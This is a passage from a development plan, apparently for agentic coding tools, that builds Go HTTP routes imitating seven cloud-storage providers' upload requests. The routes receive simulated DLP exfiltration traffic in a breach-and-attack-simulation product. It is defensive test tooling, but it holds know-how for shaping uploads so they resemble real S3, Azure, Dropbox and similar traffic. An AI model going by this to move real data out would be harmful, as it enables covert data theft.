# Cloud Storage Exfiltration Channel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a fifth DLP exfiltration channel — seven HTTP routes on the orchestrator's existing API server, each mimicking one cloud-storage provider's real upload-request shape (S3, Azure Blob, OneDrive, Google Drive, Dropbox, Google Storage, Box), each writing a destination-side receipt when a request's embedded token matches a live run.

**Architecture:** A new isolated package `internal/cloudsink` exposes a `chi.Router` mounted under `/cloudsink` on the orchestrator's already-running HTTPS API server (`internal/api/routes.go`) — no new listener, no new port, no new enable/disable config flag, since this reuses the server that's already always up. Each of the seven handlers extracts a token from wherever that provider's real API naturally carries a filename/object key, validates it against `dlp_sink_tokens`, and on a match writes one `dlp_sink_receipts` row. `internal/api/dlp_sink.go` gains one new placeholder branch (`{{SINK_CLOUD_HOST}}`/`{{SINK_CLOUD_PORT}}`) reusing the existing `{{SINK_TOKEN}}` issuance. A new scenario drives seven `Invoke-RestMethod` calls — always present, no client-tool-absence branch needed, matching SMTP's reasoning.

**Tech Stack:** Go, `net/http`/`chi` (already in this codebase), `mime/multipart` (stdlib, for Google Drive/Box's multipart bodies), PostgreSQL (`dlp_sink_tokens`/`dlp_sink_receipts`, already exist), PowerShell (`Invoke-RestMethod`).

**Spec:** `orchestrator/docs/superpowers/specs/2026-09-01-cloud-storage-exfiltration-channel-design.md`

## Global Constraints

- Seven providers, one shared MITRE technique: **T1567.002 — Exfiltration to Cloud Storage** (confirmed against `orchestrator/internal/reporting/attackdata/attack_enrichment.json`).
- Per-upload byte ceiling: **64KB** (`MaxUploadBytes` in `internal/cloudsink`), enforced via `http.MaxBytesReader` before any buffering.
- No new listener, no new port, no new `SINK_CLOUD_ENABLED` config flag — routes mount on the existing API server.
- No real cryptographic request signing anywhere (no SigV4, no Azure SAS, no OAuth) — path/method/header/body shape only.
- Every route validates the extracted token against `dlp_sink_tokens` (exact match) BEFORE writing a receipt — an unmatched token still returns a plausible success-shaped response, never a scary failure, and writes no receipt.
- One shared `rateLimiter` instance for the whole package (all seven routes together), not one per route.
- `channel` column values are exactly: `cloud-s3`, `cloud-azureblob`, `cloud-onedrive`, `cloud-gdrive`, `cloud-dropbox`, `cloud-gcs`, `cloud-box`.
- Reuse the existing 32-byte/64-hex `{{SINK_TOKEN}}` unchanged — no new token byte-length variant.
- Never log or persist raw request/response body content — only token, size, and SHA-256 hash.
- Bucket/container names (`bas-sim-bucket`, `bas-sim-container`) are fixed synthetic literals in each scenario step, not placeholders.
- Commit and push after every task — this repo builds directly on `main`, no feature branches/worktrees/PRs.

**Note on `git`:** this session has a confirmed, reproducible issue where `git` commands specifically are refused when run as a tool call (unrelated to git itself — a session-level execution restriction). Every task's commit step below is still written out in full; if blocked, run it manually (or via the CLI's `!` prefix) exactly as written.

---

## Task 1: `internal/cloudsink` core — rate limiter, byte ceiling, receipt writer, router skeleton

**Files:**
- Create: `orchestrator/internal/cloudsink/cloudsink.go`
- Create: `orchestrator/internal/cloudsink/cloudsink_test.go`

**Interfaces:**
- Produces: `const MaxUploadBytes = 64 * 1024`; `type rateLimiter struct{...}` with `newRateLimiter(limit int, window time.Duration) *rateLimiter` and `(rl *rateLimiter) allow(sourceIP string) bool` (identical shape to `internal/sftpsink`/`internal/smtpsink`'s own, duplicated not shared); `func writeReceipt(ctx context.Context, db *pgxpool.Pool, token, sourceIP, channel string, body []byte) error`; `func tokenExists(ctx context.Context, db *pgxpool.Pool, token string) bool`; `func Routes(db *pgxpool.Pool) chi.Router` (empty router in this task — routes added in later tasks).

- [ ] **Step 1: Write the failing tests**

```go
package cloudsink

import (
	"context"
	"testing"
	"time"
)

func TestRateLimiter_AllowsUpToLimitPerWindow(t *testing.T) {
	rl := newRateLimiter(3, time.Minute)
	for i := 0; i < 3; i++ {
		if !rl.allow("10.0.0.1") {
			t.Fatalf("request %d should be allowed within the limit", i)
		}
	}
	if rl.allow("10.0.0.1") {
		t.Error("4th request in the same window should be rejected")
	}
}

func TestRateLimiter_TracksSourcesIndependently(t *testing.T) {
	rl := newRateLimiter(1, time.Minute)
	if !rl.allow("10.0.0.1") {
		t.Fatal("first request from 10.0.0.1 should be allowed")
	}
	if !rl.allow("10.0.0.2") {
		t.Error("a different source IP must have its own independent limit")
	}
}

func TestTokenExists_FalseForContextCancelled(t *testing.T) {
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if tokenExists(ctx, nil, "any-token") {
		t.Error("tokenExists must not panic or return true when db is nil / ctx is cancelled")
	}
}
```

The third test is deliberately defensive (nil `db`) — every handler in later tasks calls `tokenExists` on the request path, and a panic there would turn a bad request into a 500 instead of the "still returns a plausible success, just no receipt" behavior the spec requires. Guard for it now, at the shared helper, once.

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/cloudsink/... -run . -v 2>&1 | head -40`
Expected: FAIL — package `cloudsink` does not exist yet.

- [ ] **Step 3: Write the implementation**

```go
// Package cloudsink implements HTTP routes that mimic seven cloud-storage
// providers' real upload-request shapes (path, method, headers, body
// structure) for the DLP validation suite. Unlike internal/dnssink,
// internal/sftpsink, and internal/smtpsink -- each a genuinely distinct
// non-HTTP wire protocol needing its own listener -- these seven providers
// are all HTTPS REST APIs, so this package exposes routes mounted on the
// orchestrator's existing API server rather than owning a separate
// listener. No real cryptographic request signing (SigV4, Azure SAS,
// OAuth) is implemented anywhere in this package -- see
// docs/superpowers/specs/2026-09-01-cloud-storage-exfiltration-channel-design.md.
package cloudsink

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"sync"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

// MaxUploadBytes bounds the total bytes any of the seven routes will buffer
// for a single request body. Matches sftpsink.MaxUploadBytes and
// smtpsink.MaxMessageBytes exactly, for consistency across every channel in
// this program.
const MaxUploadBytes = 64 * 1024

// rateLimiter is a coarse, fixed-window per-source-IP abuse guard -- one
// instance shared across all seven routes (they are seven doors into the
// same abuse surface, not seven independent ones), identical in shape to
// internal/sftpsink's and internal/smtpsink's own, duplicated here rather
// than shared because that type is unexported in each sibling package.
type rateLimiter struct {
	mu     sync.Mutex
	limit  int
	window time.Duration
	counts map[string]*windowCount
}

type windowCount struct {
	count      int
	windowEnds time.Time
}

func newRateLimiter(limit int, window time.Duration) *rateLimiter {
	return &rateLimiter{limit: limit, window: window, counts: map[string]*windowCount{}}
}

// allow reports whether sourceIP may make another request in the current
// window, incrementing its count as a side effect.
func (rl *rateLimiter) allow(sourceIP string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	wc, ok := rl.counts[sourceIP]
	if !ok || now.After(wc.windowEnds) {
		rl.counts[sourceIP] = &windowCount{count: 1, windowEnds: now.Add(rl.window)}
		return true
	}
	wc.count++
	return wc.count <= rl.limit
}

// rateLimitPerSecond is a coarse per-source-IP abuse guard, matching every
// sibling channel's identical rationale: this surface only ever expects
// traffic from BAS agents running a scenario step.
const rateLimitPerSecond = 5

var limiter = newRateLimiter(rateLimitPerSecond, time.Second)

// tokenExists reports whether token has a live row in dlp_sink_tokens.
// Returns false (never panics) for a nil db or a cancelled/errored query --
// every handler treats "false" identically to "not matched": still return a
// plausible success response, just never write a receipt. Cloud storage
// validates the token before writing a receipt (unlike the HTTP/SFTP
// accept-anything pattern) because seven open, unauthenticated endpoints
// accepting any request body is a meaningfully larger accidental-scanning
// surface than one SMTP listener or one narrow SFTP filename check -- same
// reasoning SMTP's Subject-match requirement already established.
func tokenExists(ctx context.Context, db *pgxpool.Pool, token string) bool {
	if db == nil || token == "" {
		return false
	}
	var exists bool
	if err := db.QueryRow(ctx,
		`SELECT EXISTS(SELECT 1 FROM dlp_sink_tokens WHERE token = $1)`, token,
	).Scan(&exists); err != nil {
		return false
	}
	return exists
}

// writeReceipt hashes body (SHA-256, raw content never persisted -- same
// rule every channel in this program follows) and writes one
// dlp_sink_receipts row for the given channel. Callers must have already
// confirmed the token exists via tokenExists.
func writeReceipt(ctx context.Context, db *pgxpool.Pool, token, sourceIP, channel string, body []byte) error {
	sum := sha256.Sum256(body)
	_, err := db.Exec(ctx,
		`INSERT INTO dlp_sink_receipts (token, source_ip, payload_hash, payload_size, channel)
		 VALUES ($1, $2, $3, $4, $5)`,
		token, sourceIP, hex.EncodeToString(sum[:]), len(body), channel,
	)
	return err
}

// Routes returns the chi.Router mounted at /cloudsink by
// internal/api/routes.go. Individual provider routes are registered in
// Tasks 2-5 of this plan; this task's version returns an empty router so
// the package compiles and Mount()'s wiring (Task 6) has something real to
// point at from the start.
func Routes(db *pgxpool.Pool) chi.Router {
	r := chi.NewRouter()
	return r
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/cloudsink/... -v`
Expected: PASS for all 3 tests.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/cloudsink/cloudsink.go internal/cloudsink/cloudsink_test.go
git add internal/cloudsink/cloudsink.go internal/cloudsink/cloudsink_test.go
git commit -m "feat(cloudsink): add rate limiter, receipt writer, and router skeleton for the cloud storage DLP sink"
git push
```

---

## Task 2: S3 and Azure Blob handlers — path-segment token extraction

**Files:**
- Create: `orchestrator/internal/cloudsink/s3.go`
- Create: `orchestrator/internal/cloudsink/azureblob.go`
- Create: `orchestrator/internal/cloudsink/s3_test.go`
- Create: `orchestrator/internal/cloudsink/azureblob_test.go`
- Modify: `orchestrator/internal/cloudsink/cloudsink.go` (register both routes in `Routes`)

**Interfaces:**
- Consumes: `MaxUploadBytes`, `tokenExists`, `writeReceipt`, `limiter` (Task 1).
- Produces: `func handleS3Put(db *pgxpool.Pool) http.HandlerFunc`, `func handleAzureBlobPut(db *pgxpool.Pool) http.HandlerFunc`.

These are the simplest two providers: the token is the literal filename portion of a URL path segment (S3's object key, Azure's blob name), stripped of its `.dat` suffix.

- [ ] **Step 1: Write the failing tests**

```go
// s3_test.go
package cloudsink

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
)

func TestS3Put_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718"
		seedToken(t, pool, token, "run-s3-1", "T1567.002")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		body := []byte("[BAS-SIM-DLP] test payload")
		req, _ := http.NewRequest(http.MethodPut, srv.URL+"/s3/bas-sim-bucket/"+token+".dat", bytes.NewReader(body))
		req.Header.Set("x-amz-content-sha256", "UNSIGNED-PAYLOAD")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("PUT: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}

		assertReceiptRecorded(t, pool, token, "cloud-s3", len(body))
	})
}

func TestS3Put_UnmatchedTokenStillSucceedsNoReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		req, _ := http.NewRequest(http.MethodPut, srv.URL+"/s3/bas-sim-bucket/never-issued-token.dat", bytes.NewReader([]byte("x")))
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("PUT: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200 even for an unmatched token", resp.StatusCode)
		}
		assertNoReceipt(t, pool, "never-issued-token")
	})
}

func TestS3Put_OversizedBodyRejected(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		tooBig := bytes.Repeat([]byte("x"), MaxUploadBytes+1024)
		req, _ := http.NewRequest(http.MethodPut, srv.URL+"/s3/bas-sim-bucket/oversized.dat", bytes.NewReader(tooBig))
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("PUT: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Error("a body exceeding MaxUploadBytes should not return 200")
		}
	})
}

// seedToken inserts a dlp_sink_tokens row directly, matching
// issueSinkTokensAndSubstitute's own insert shape.
func seedToken(t *testing.T, pool *pgxpool.Pool, token, runID, techniqueID string) {
	t.Helper()
	if _, err := pool.Exec(context.Background(),
		`INSERT INTO dlp_sink_tokens (token, run_id, technique_id, expires_at) VALUES ($1, $2, $3, $4)`,
		token, runID, techniqueID, time.Now().Add(10*time.Minute),
	); err != nil {
		t.Fatalf("seed dlp_sink_tokens: %v", err)
	}
}

// assertReceiptRecorded polls for up to 5s (handlers write asynchronously
// from the test's perspective in the sense that the HTTP response may
// return before the DB write's result is visible to a separate connection
// under some isolation levels -- polling avoids a flaky race).
func assertReceiptRecorded(t *testing.T, pool *pgxpool.Pool, token, wantChannel string, wantSize int) {
	t.Helper()
	var channel string
	var size int
	deadline := time.Now().Add(5 * time.Second)
	for {
		err := pool.QueryRow(context.Background(),
			`SELECT channel, payload_size FROM dlp_sink_receipts WHERE token = $1`, token,
		).Scan(&channel, &size)
		if err == nil {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("no dlp_sink_receipts row for token within 5s: %v", err)
		}
		time.Sleep(50 * time.Millisecond)
	}
	if channel != wantChannel {
		t.Errorf("channel = %q, want %q", channel, wantChannel)
	}
	if size != wantSize {
		t.Errorf("payload_size = %d, want %d", size, wantSize)
	}
}

func assertNoReceipt(t *testing.T, pool *pgxpool.Pool, token string) {
	t.Helper()
	time.Sleep(200 * time.Millisecond) // let any (incorrect) async write land before checking
	var count int
	if err := pool.QueryRow(context.Background(),
		`SELECT count(*) FROM dlp_sink_receipts WHERE token = $1`, token,
	).Scan(&count); err != nil {
		t.Fatalf("count receipts: %v", err)
	}
	if count != 0 {
		t.Errorf("dlp_sink_receipts rows for unmatched token = %d, want 0", count)
	}
}
```

```go
// azureblob_test.go
package cloudsink

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestAzureBlobPut_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1"
		seedToken(t, pool, token, "run-azureblob-1", "T1567.002")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		body := []byte("[BAS-SIM-DLP] test payload")
		req, _ := http.NewRequest(http.MethodPut, srv.URL+"/azureblob/bas-sim-container/"+token+".dat", bytes.NewReader(body))
		req.Header.Set("x-ms-version", "2021-08-06")
		req.Header.Set("x-ms-blob-type", "BlockBlob")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("PUT: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusCreated {
			t.Errorf("status = %d, want 201 (matching real Azure Blob PUT Blob's own success code)", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "cloud-azureblob", len(body))
	})
}
```

Add the shared `sharedDB`/`TestMain` scaffolding (this is the first test file in the package to need it):

```go
// cloudsink_test.go (append to the file created in Task 1)
package cloudsink

import (
	"flag"
	"os"
	"testing"

	"github.com/audspect/bas/internal/testutil"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	flag.Parse()
	if testing.Short() {
		os.Exit(m.Run())
	}
	sharedDB = testutil.MustSharedTestDB()
	code := m.Run()
	sharedDB.Cleanup()
	os.Exit(code)
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/cloudsink/... -run "S3|AzureBlob" -v 2>&1 | head -40`
Expected: FAIL — `handleS3Put`/`handleAzureBlobPut` undefined, routes not registered (404s).

- [ ] **Step 3: Write the implementation**

```go
// s3.go
package cloudsink

import (
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

// handleS3Put mimics AWS S3's path-style PUT-object request: the object key
// (the last path segment) carries the token as its filename, stripped of
// the .dat extension every scenario step uses. No real SigV4 signature is
// checked -- see the design spec's fidelity-bar decision.
func handleS3Put(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}
		token := strings.TrimSuffix(chi.URLParam(r, "key"), ".dat")

		r.Body = http.MaxBytesReader(w, r.Body, MaxUploadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		if tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "cloud-s3", body)
		}
		w.Header().Set("ETag", `"bas-sim-etag"`)
		w.WriteHeader(http.StatusOK)
	}
}
```

```go
// azureblob.go
package cloudsink

import (
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

// handleAzureBlobPut mimics Azure Blob Storage's PUT Blob request: the
// blob name (the last path segment) carries the token. Real Azure Blob PUT
// Blob returns 201 Created on success, unlike S3's 200 OK -- matched here
// so a DLP/CASB product's status-code expectations aren't a tell that this
// is a simulation.
func handleAzureBlobPut(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}
		token := strings.TrimSuffix(chi.URLParam(r, "blob"), ".dat")

		r.Body = http.MaxBytesReader(w, r.Body, MaxUploadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		if tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "cloud-azureblob", body)
		}
		w.WriteHeader(http.StatusCreated)
	}
}
```

Update `Routes` in `cloudsink.go`:

```go
func Routes(db *pgxpool.Pool) chi.Router {
	r := chi.NewRouter()
	r.Put("/s3/{bucket}/{key}", handleS3Put(db))
	r.Put("/azureblob/{container}/{blob}", handleAzureBlobPut(db))
	return r
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/cloudsink/... -v`
Expected: PASS for all tests (Task 1's 3 plus Task 2's 4).

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/cloudsink/*.go
git add internal/cloudsink/s3.go internal/cloudsink/azureblob.go internal/cloudsink/s3_test.go internal/cloudsink/azureblob_test.go internal/cloudsink/cloudsink.go internal/cloudsink/cloudsink_test.go
git commit -m "feat(cloudsink): add S3 and Azure Blob traffic-shape simulation handlers"
git push
```

---

## Task 3: OneDrive handler — mixed literal/param path segment

**Files:**
- Create: `orchestrator/internal/cloudsink/onedrive.go`
- Create: `orchestrator/internal/cloudsink/onedrive_test.go`
- Modify: `orchestrator/internal/cloudsink/cloudsink.go` (register route)

**Interfaces:**
- Consumes: same as Task 2.
- Produces: `func handleOneDrivePut(db *pgxpool.Pool) http.HandlerFunc`.

Microsoft Graph's real upload-by-path shape is `PUT /v1.0/me/drive/root:/{path}:/content` — the `{filename}` parameter sits inside a segment with a literal trailing colon (`{filename}:`), not as a whole segment on its own. chi/v5's router supports a named parameter followed by a literal suffix within the same segment (the same mechanism used for patterns like `{id}.json`), and `chi.URLParam` returns just the captured parameter text with that literal suffix already excluded.

- [ ] **Step 1: Write the failing test**

```go
package cloudsink

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestOneDrivePut_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2"
		seedToken(t, pool, token, "run-onedrive-1", "T1567.002")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		body := []byte("[BAS-SIM-DLP] test payload")
		uri := srv.URL + "/graph/v1.0/me/drive/root:/" + token + ".dat:/content"
		req, _ := http.NewRequest(http.MethodPut, uri, bytes.NewReader(body))
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("PUT: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "cloud-onedrive", len(body))
	})
}

func TestOneDrivePut_UnmatchedTokenStillSucceedsNoReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		uri := srv.URL + "/graph/v1.0/me/drive/root:/never-issued.dat:/content"
		req, _ := http.NewRequest(http.MethodPut, uri, bytes.NewReader([]byte("x")))
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("PUT: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200 even for an unmatched token", resp.StatusCode)
		}
		assertNoReceipt(t, pool, "never-issued")
	})
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd orchestrator && go test ./internal/cloudsink/... -run OneDrive -v 2>&1 | head -30`
Expected: FAIL — route not registered (404) / `handleOneDrivePut` undefined.

- [ ] **Step 3: Write the implementation**

```go
// onedrive.go
package cloudsink

import (
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/jackc/pgx/v5/pgxpool"
)

// handleOneDrivePut mimics Microsoft Graph's upload-by-path request shape
// (PUT .../root:/{path}:/content). The filename carries the token.
func handleOneDrivePut(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}
		token := strings.TrimSuffix(chi.URLParam(r, "filename"), ".dat")

		r.Body = http.MaxBytesReader(w, r.Body, MaxUploadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		if tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "cloud-onedrive", body)
		}
		w.WriteHeader(http.StatusOK)
	}
}
```

Update `Routes` in `cloudsink.go`:

```go
	r.Put("/graph/v1.0/me/drive/root:/{filename}:/content", handleOneDrivePut(db))
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/cloudsink/... -v`
Expected: PASS for all tests so far.

If the mixed-literal route pattern doesn't match as written (chi version-dependent edge case), the fallback is a wildcard: register `r.Put("/graph/v1.0/me/drive/root:/*", handleOneDrivePut(db))` and extract the filename in the handler via `strings.TrimSuffix(strings.TrimPrefix(chi.URLParam(r, "*"), ""), ":/content")` after trimming the `:/content` suffix from the wildcard match manually. Only fall back to this if the primary pattern's test genuinely fails after Step 2 confirms the specific failure is route-matching, not a different bug.

- [ ] **Step 5: gofmt and commit**

```bash
cd orchestrator
gofmt -l internal/cloudsink/*.go
git add internal/cloudsink/onedrive.go internal/cloudsink/onedrive_test.go internal/cloudsink/cloudsink.go
git commit -m "feat(cloudsink): add OneDrive (Microsoft Graph) traffic-shape simulation handler"
git push
```

---

## Task 4: Dropbox and Google Storage handlers — header-JSON and query-param token extraction

**Files:**
- Create: `orchestrator/internal/cloudsink/dropbox.go`
- Create: `orchestrator/internal/cloudsink/gcs.go`
- Create: `orchestrator/internal/cloudsink/dropbox_test.go`
- Create: `orchestrator/internal/cloudsink/gcs_test.go`
- Modify: `orchestrator/internal/cloudsink/cloudsink.go` (register both routes)

**Interfaces:**
- Consumes: same as Task 2.
- Produces: `func handleDropboxUpload(db *pgxpool.Pool) http.HandlerFunc`, `func handleGCSUpload(db *pgxpool.Pool) http.HandlerFunc`.

- [ ] **Step 1: Write the failing tests**

```go
// dropbox_test.go
package cloudsink

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestDropboxUpload_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3"
		seedToken(t, pool, token, "run-dropbox-1", "T1567.002")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		body := []byte("[BAS-SIM-DLP] test payload")
		apiArg, _ := json.Marshal(map[string]string{"path": "/" + token + ".dat", "mode": "add"})
		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/dropbox/2/files/upload", bytes.NewReader(body))
		req.Header.Set("Dropbox-API-Arg", string(apiArg))
		req.Header.Set("Content-Type", "application/octet-stream")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "cloud-dropbox", len(body))
	})
}

func TestDropboxUpload_MalformedAPIArgStillSucceedsNoReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		req, _ := http.NewRequest(http.MethodPost, srv.URL+"/dropbox/2/files/upload", bytes.NewReader([]byte("x")))
		req.Header.Set("Dropbox-API-Arg", "not valid json")
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200 even for a malformed/unmatched Dropbox-API-Arg", resp.StatusCode)
		}
	})
}
```

```go
// gcs_test.go
package cloudsink

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"testing"
)

func TestGCSUpload_MatchedTokenRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		token := "e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4e5f60718a1b2c3d4"
		seedToken(t, pool, token, "run-gcs-1", "T1567.002")

		srv := httptest.NewServer(Routes(pool))
		defer srv.Close()

		body := []byte("[BAS-SIM-DLP] test payload")
		uri := srv.URL + "/gcs/upload/storage/v1/b/bas-sim-bucket/o?uploadType=media&name=" + token + ".dat"
		req, _ := http.NewRequest(http.MethodPost, uri, bytes.NewReader(body))
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatalf("POST: %v", err)
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Errorf("status = %d, want 200", resp.StatusCode)
		}
		assertReceiptRecorded(t, pool, token, "cloud-gcs", len(body))
	})
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/cloudsink/... -run "Dropbox|GCS" -v 2>&1 | head -40`
Expected: FAIL — handlers undefined, routes not registered.

- [ ] **Step 3: Write the implementation**

```go
// dropbox.go
package cloudsink

import (
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
)

// handleDropboxUpload mimics Dropbox's /2/files/upload request: the
// destination path is a JSON object in the Dropbox-API-Arg header, not the
// URL or body. A missing/malformed header is treated identically to an
// unmatched token -- still a 200, never a receipt.
func handleDropboxUpload(db *pgxpool.Pool) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		host, _, err := net.SplitHostPort(r.RemoteAddr)
		if err != nil {
			host = r.RemoteAddr
		}
		if !limiter.allow(host) {
			w.WriteHeader(http.StatusTooManyRequests)
			return
		}

		r.Body = http.MaxBytesReader(w, r.Body, MaxUploadBytes)
		body, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "request entity too large", http.StatusRequestEntityTooLarge)
			return
		}

		var apiArg struct {
			Path string `json:"path"`
		}
		token := ""
		if err := json.Unmarshal([]byte(r.Header.Get("Dropbox-API-Arg")), &apiArg); err == nil {
			token = strings.TrimSuffix(strings.TrimPrefix(apiArg.Path, "/"), ".dat")
		}

		if token != "" && tokenExists(r.Context(), db, token) {
			_ = writeReceipt(r.Context(), db, token, host, "cloud-dropbox", body)
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte(`{"name":"bas-sim","id":"bas-sim-id"}`))
	}
}
```

```go
// gcs.go
package cloudsink

import (
	"io"
	"net"
	"net/http"
	"strings"

	"github.com/jackc/pgx/v5/pgxpool"
